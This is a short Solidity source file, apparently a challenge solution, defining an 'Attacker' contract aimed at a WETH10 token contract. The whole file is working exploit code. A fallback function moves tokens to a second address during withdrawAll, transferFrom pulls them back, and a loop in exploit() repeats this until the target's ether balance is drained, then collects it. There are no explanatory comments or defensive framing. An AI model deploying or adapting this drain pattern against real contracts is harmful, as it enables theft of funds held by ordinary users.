pragma solidity ^0.8.0;

import "./weth10.sol";

contract Attacker {
    WETH10 public target;
    address public bob;

    constructor(address payable _target, address payable _bob) {
        target = WETH10(_target);
        bob = _bob;
    }

    fallback() external payable {
        target.transfer(bob, 1 ether);
    }

    function deposit(uint256 amount) public payable {
        target.deposit{value: (amount)}();
    }

    function withdrawAll() public {
        payable(msg.sender).transfer(address(this).balance);
    }

    function attack(uint256 amount) public {
        uint256 prevBalance = address(target).balance;
        target.withdrawAll();
        prevBalance = address(target).balance;
        target.transferFrom(bob, address(this), amount);
    }

    function exploit() external payable {
        deposit(1 ether);
        while ((address(target).balance) > 1 wei) {
            attack(1 ether);
        }
        withdrawAll();
    }
}
